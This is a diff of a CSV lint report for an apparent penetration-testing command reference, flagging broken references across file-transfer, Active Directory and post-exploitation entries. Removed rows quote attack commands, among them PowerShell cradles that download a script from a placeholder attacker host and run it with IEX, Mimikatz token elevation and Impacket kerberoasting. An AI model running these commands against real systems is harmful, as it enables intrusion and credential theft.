@@ -1,43 +1,7 @@
 file,command_id,field,violation_type,text,confidence,candidates
-data/commands/file-transfer/file-verification.json,ft-file-verify-md5,alternatives,text_instead_of_id,"sha256sum <FILE> (SHA-256, more secure but slower)",missing,
-data/commands/file-transfer/file-verification.json,ft-file-verify-md5,alternatives,text_instead_of_id,Get-FileHash <FILE> (PowerShell on Windows),fuzzy,powershell-download | powershell-runas-output-redirect | powershell-invoke-webrequest | powershell-ep-bypass-flag | powershell-get-content
-data/commands/file-transfer/file-verification.json,ft-file-verify-md5,alternatives,text_instead_of_id,certutil -hashfile <FILE> MD5 (Windows built-in),missing,
-data/commands/file-transfer/file-verification.json,ft-powershell-execute-memory,alternatives,text_instead_of_id,IWR -Uri http://<LHOST>/<SCRIPT>.ps1 -UseBasicParsing | IEX (PowerShell 3.0+),fuzzy,ps-find-new-domain-admin | ps-sort-memory | ps-reverse-shell-encoder-python | ps-get-group-members-basic | ps-pid-details
-data/commands/file-transfer/file-verification.json,ft-powershell-execute-memory,alternatives,text_instead_of_id,(New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1') | IEX (explicit pipe),fuzzy,ps-find-new-domain-admin | ps-sort-memory | ps-reverse-shell-encoder-python | ps-get-group-members-basic | ps-pid-details
-data/commands/file-transfer/file-verification.json,ft-powershell-execute-memory,alternatives,text_instead_of_id,IEX (Get-Content \\<LHOST>\share\script.ps1 -Raw) (SMB-based),fuzzy,ps-find-new-domain-admin | ps-sort-memory | ps-reverse-shell-encoder-python | ps-get-group-members-basic | ps-pid-details
-data/commands/monitoring/linux-process-monitoring.json,systemctl-list,next_steps,broken_reference,systemctl-status-service,broken,
-data/commands/monitoring/linux-process-monitoring.json,systemctl-list,next_steps,broken_reference,systemctl-show-service,broken,
-data/commands/monitoring/linux-process-monitoring.json,systemctl-list,next_steps,broken_reference,find-writable-service-files,broken,
-data/commands/monitoring/linux-process-monitoring.json,systemctl-list,next_steps,broken_reference,linux-process-enumeration,broken,
-data/commands/monitoring/linux-process-monitoring.json,systemctl-list,alternatives,text_instead_of_id,service --status-all,missing,
-data/commands/monitoring/linux-process-monitoring.json,systemctl-list,alternatives,text_instead_of_id,chkconfig --list,missing,
-data/commands/monitoring/linux-process-monitoring.json,lsof-list,next_steps,broken_reference,curl-local-service,broken,
-data/commands/monitoring/linux-process-monitoring.json,lsof-list,next_steps,broken_reference,port-forward-ssh,broken,
-data/commands/monitoring/linux-process-monitoring.json,lsof-list,next_steps,broken_reference,chisel-port-forward,broken,
-data/commands/monitoring/linux-process-monitoring.json,lsof-list,next_steps,broken_reference,linux-process-enumeration,broken,
-data/commands/monitoring/linux-process-monitoring.json,lsof-list,alternatives,text_instead_of_id,netstat -tulpn,missing,
-data/commands/monitoring/linux-process-monitoring.json,lsof-list,alternatives,text_instead_of_id,ss -tulpn,missing,
-data/commands/monitoring/linux-process-monitoring.json,lsof-list,alternatives,broken_reference,netstat-listening-ports,broken,
-data/commands/active-directory/ad-golden-ticket.json,ad-golden-ticket-verify-klist,alternatives,broken_reference,rubeus-klist-display,broken,
-data/commands/active-directory/ad-credential-validation.json,crackmapexec-validate-admin,next_steps,broken_reference,psexec,broken,
-data/commands/active-directory/ad-credential-validation.json,crackmapexec-validate-admin,next_steps,broken_reference,smbexec,broken,
-data/commands/active-directory/ad-credential-validation.json,crackmapexec-validate-admin,next_steps,broken_reference,wmiexec,broken,
-data/commands/active-directory/ad-credential-validation.json,crackmapexec-validate-admin,next_steps,broken_reference,secretsdump,broken,
-data/commands/active-directory/ad-credential-extraction.json,ad-lsass-dump-procdump,next_steps,broken_reference,windows-smb-exfiltrate-file,broken,
-data/commands/active-directory/ad-credential-extraction.json,ad-sam-dump-reg-save,next_steps,broken_reference,windows-smb-exfiltrate-file,broken,
-data/commands/post-exploit/windows-password-and-access.json,windows-hashcat-crack-ntlm,alternatives,broken_reference,john-crack-ntlm,broken,
-data/commands/post-exploit/windows-password-and-access.json,windows-hashcat-crack-ntlm-file,alternatives,broken_reference,john-crack-ntlm-rules,broken,
-data/commands/post-exploit/windows-powershell-cmdlets.json,get-ciminstance,alternatives,broken_reference,get-wmiobject,broken,
-data/commands/post-exploit/windows-post-exploitation.json,windows-screenshot-capture,next_steps,broken_reference,windows-smb-exfiltrate-file,broken,
-data/commands/post-exploit/windows-post-exploitation.json,windows-net-use-smb-connect,alternatives,text_instead_of_id,"pushd \\\\<TARGET>\\<SHARE> (temporary mapping, auto-disconnects)",missing,
-data/commands/post-exploit/windows-post-exploitation.json,windows-net-use-smb-connect,alternatives,text_instead_of_id,New-PSDrive -Name Z -PSProvider FileSystem -Root \\\\<TARGET>\\<SHARE> -Credential $cred (PowerShell),fuzzy,ps-find-new-domain-admin | ps-sort-memory | ps-reverse-shell-encoder-python | ps-get-group-members-basic | ps-pid-details
-data/commands/post-exploit/windows-post-exploitation.json,kerberos-klist-purge,alternatives,text_instead_of_id,"mimikatz.exe ""kerberos::purge"" ""exit"" (Mimikatz alternative)",fuzzy,mimikatz-sekurlsa-logonpasswords | mimikatz-privilege-debug | mimikatz-sekurlsa-tickets-export
-data/commands/post-exploit/windows-post-exploitation.json,kerberos-klist-purge,alternatives,text_instead_of_id,Rubeus.exe purge (Rubeus alternative),fuzzy,rubeus-ptt | rubeus-kerberoast-aes | rubeus-kerberoast | rubeus-asreproast
-data/commands/post-exploit/windows-post-exploitation.json,windows-psexec-system-shell,alternatives,text_instead_of_id,"mimikatz.exe ""privilege::debug"" ""token::elevate"" ""exit"" (Mimikatz token elevation)",fuzzy,mimikatz-sekurlsa-logonpasswords | mimikatz-privilege-debug | mimikatz-sekurlsa-tickets-export
-data/commands/post-exploit/windows-post-exploitation.json,windows-psexec-system-shell,alternatives,text_instead_of_id,"Start-Process cmd.exe -Verb RunAs (PowerShell elevation, requires GUI)",fuzzy,powershell-download | powershell-runas-output-redirect | powershell-invoke-webrequest | powershell-ep-bypass-flag | powershell-get-content
-data/commands/post-exploit/windows-post-exploitation.json,powerview-enumerate-spns,alternatives,text_instead_of_id,Get-ADUser -Filter {ServicePrincipalName -ne '$null'} (ActiveDirectory module),fuzzy,nc-listener-setup | nc-file-transfer | nc-listener-tcp | nc-connect | nc-listener-non-staged
-data/commands/post-exploit/windows-post-exploitation.json,powerview-enumerate-spns,alternatives,text_instead_of_id,setspn -T <DOMAIN> -Q */* (Windows built-in),missing,
-data/commands/post-exploit/windows-post-exploitation.json,powerview-enumerate-spns,alternatives,text_instead_of_id,GetUserSPNs.py <DOMAIN>/<USER>:<PASS> (Impacket from Kali),fuzzy,impacket-getnpusers-identify | impacket-secretsdump | impacket-psexec | impacket-smbserver | impacket-smbexec
-data/commands/post-exploit/windows-post-exploitation.json,ad-dcsync-check-privileges,alternatives,text_instead_of_id,"(Get-Acl 'AD:\DC=corp,DC=com').Access | Where-Object {$_.ObjectType -like '*Replication*'} (ActiveDirectory module)",missing,
-data/commands/post-exploit/windows-post-exploitation.json,ad-dcsync-check-privileges,alternatives,text_instead_of_id,"adfind.exe -b 'DC=corp,DC=com' -s base nTSecurityDescriptor (ADFind tool)",missing,
-data/commands/exploitation/metasploit-meterpreter.json,meterpreter-getsystem,alternatives,broken_reference,windows-exploit-suggester,broken,
+data/commands/pivoting/windows-utilities.json,systeminfo-windows,alternatives,broken_reference,powershell-get-computerinfo,broken,
+data/commands/pivoting/windows-utilities.json,whoami-priv,alternatives,broken_reference,powershell-get-privilege,broken,
+data/commands/pivoting/windows-utilities.json,ipconfig-all,alternatives,broken_reference,powershell-get-netipaddress,broken,
+data/commands/enumeration/password-attacks-wordlist-rules.json,rule-append-digit,next_steps,broken_reference,hashcat-wordlist-rules,broken,
+data/commands/enumeration/password-attacks-wordlist-rules.json,rule-prepend-year,next_steps,broken_reference,hashcat-wordlist-rules,broken,
+data/commands/enumeration/password-attacks-wordlist-rules.json,rule-capitalize-append,next_steps,broken_reference,hashcat-wordlist-rules,broken,
